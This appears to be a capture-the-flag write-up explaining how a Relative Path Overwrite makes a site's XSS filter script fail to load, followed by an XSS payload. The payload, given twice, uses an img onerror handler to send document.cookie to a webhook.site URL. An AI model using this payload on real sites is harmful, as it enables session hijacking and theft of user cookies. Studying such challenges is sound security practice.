# Relative Path Overwrite

This challenge involves bypassing an xss filter using RPO, then leaking cookie via SSRF

## Solve
### Bypassing the filter
The website filters these keywords when pass in data as `param` on /vuln.php page
```javascript
var filter = ["script", "on", "frame", "object"];
```

Vuln page code:
```html
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter !== 'undefined') {
        ...
```

Notice how the web try to fetch `filter.js` using a relative path, that means we can effectively 404 the request by changing where we access our vuln page

### Payload
Testing on /vuln.php: add the `index.php` to change our relative path, 404 the filter.js fetch. Note 
```
http://chall.site/index.php/?page=vuln&param=<img src=x onerror=fetch('https://webhook.site/uid/?flag='.concat(document.cookie))>
```

Payload when submitting report:
```
index.php/?page=vuln&param=<img src=x onerror=fetch('https://webhook.site/uid/?flag='.concat(document.cookie))>
```

